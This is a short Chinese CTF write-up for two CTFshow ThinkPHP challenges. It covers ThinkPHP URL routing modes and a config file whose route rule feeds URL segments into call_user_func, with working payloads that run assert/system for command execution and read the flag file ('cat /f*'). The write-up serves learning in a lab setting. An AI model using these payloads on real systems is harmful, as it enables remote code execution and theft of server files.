# CTFSHOW-Thinkphp专题

---

### WEB-569

题目提示：

![image-20250116153844805](https://gitee.com/bx33661/image/raw/master/path/image-20250116153844805.png)

学习了解pathinfo方式

```
index.php/Admin/Login/ctfshowLogin
index.php?s=/Admin&c=Login&a=ctfshowLogin


PATHINFO模式
/index.php/Admin/Login/ctfshowLogin

普通模式
/index.php?m=Admin&c=Login&f=ctfshowLogin

兼容模式
/index.php?s=Admin/Login/ctfshowLogin

REWRITE模式
/Admin/Login/ctfshowLogin
```



### web579

在/common/conf.php中发现了危险函数

```php
<?php
return array(
	//'配置项'=>'配置值'
	'DB_TYPE'               =>  'mysql',     // 数据库类型
    'DB_HOST'               =>  '127.0.0.1', // 服务器地址
    'DB_NAME'               =>  'ctfshow',          // 数据库名
    'DB_USER'               =>  'root',      // 用户名
    'DB_PWD'                =>  'ctfshow',          // 密码
    'DB_PORT'               =>  '3306',        // 端口
    'URL_ROUTER_ON'   => true, 
	'URL_ROUTE_RULES' => array(
    'ctfshow/:f/:a' =>function($f,$a){
    	call_user_func($f, $a);
    	}
    )
);
```

---》/index.php/ctfshow/assert/phpinfo()

![image-20250116202054008](https://gitee.com/bx33661/image/raw/master/path/image-20250116202054008.png)

```(空)
index.php/ctfshow/assert/system($_POST['a']);

a=cat /f*
```

